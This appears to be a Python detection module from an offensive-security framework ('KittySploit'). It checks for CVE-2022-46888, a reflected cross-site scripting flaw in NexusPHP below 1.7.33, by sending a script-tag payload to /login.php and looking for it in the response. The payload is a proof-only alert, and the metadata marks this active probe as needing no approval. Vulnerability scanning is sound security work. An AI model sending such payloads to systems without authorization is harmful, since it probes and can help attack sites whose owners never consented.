#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NexusPHP before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NexusPHP <1.7.33 - Cross-Site Scripting Detection',
        'description': 'NexusPHP before 1.7.33 contains multiple cross-site scripting vulnerabilities via the secret parameter in /login.php; q parameter in /user-ban-log.php; query parameter in /log.php; text parameter in /moresmiles.php; q parameter in myhr.php; or id parameter in /viewrequests.php. An attacker can inject arbitrary web script or HTML, which can allow theft of cookie-based authentication credentials and launch of other attacks..',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'nexus', 'php', 'nexusphp', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.surecloud.com/resources/blog/nexusphp-surecloud-security-review-identifies-authenticated-unauthenticated-vulnerabilities',
            'https://github.com/xiaomlove/nexusphp/releases/tag/v1.7.33',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-46888',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-46888',
    }

    def run(self):
        r = self.http_request(method="GET", path='/login.php?secret="><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        body_all = ('value=""><script>alert(document.domain)</script>">', 'nexusphp',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="NexusPHP <1.7.33 - Cross-Site Scripting detected",
                path='/login.php?secret="><script>alert(document.domain)</script>',
            )
            return True
        return False

